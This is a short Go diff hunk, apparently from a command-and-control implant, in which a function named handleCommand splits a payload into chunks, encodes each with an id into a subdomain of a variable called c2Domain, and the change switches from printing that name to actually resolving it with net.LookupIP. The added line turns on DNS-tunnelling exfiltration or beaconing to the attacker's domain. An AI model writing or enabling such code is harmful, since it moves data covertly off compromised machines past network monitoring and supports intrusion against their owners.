@@ -65,8 +65,8 @@ func handleCommand(c, uid string) {
 		chunknumber := x
 		maxChunks := blocks
 		lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s", payload, chunknumber, maxChunks, uid, c2Domain)
-		//net.LookupIP(lookupaddr)
-		fmt.Println(lookupaddr)
+		net.LookupIP(lookupaddr)
+		//fmt.Println(lookupaddr)
 	}
 }
 
